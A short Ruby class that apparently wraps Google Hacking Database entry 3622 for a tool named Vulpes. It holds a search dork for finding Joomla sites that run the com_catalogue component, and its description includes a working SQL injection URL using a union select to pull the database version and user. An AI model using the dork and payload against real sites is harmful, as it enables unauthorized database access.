module Dorks
   class Dork3622 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3622",
            ghdb_url: "https://www.exploit-db.com/ghdb/3622",
            severity: "5",
            category: "advisories_and_vulnerabilities.sqli",
            publish_date: "2010-11-25",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"index.php?option=com_catalogue"
EDORK
            description: <<~EDESC
Author: Ashiyane Digital Security Team SQL Injection: http://server/index.php?option=com_catalogue&Itemid=73&cat_id=-999 union select 1,version(),user(),4,5,6
EDESC
         })

      end
   end
end
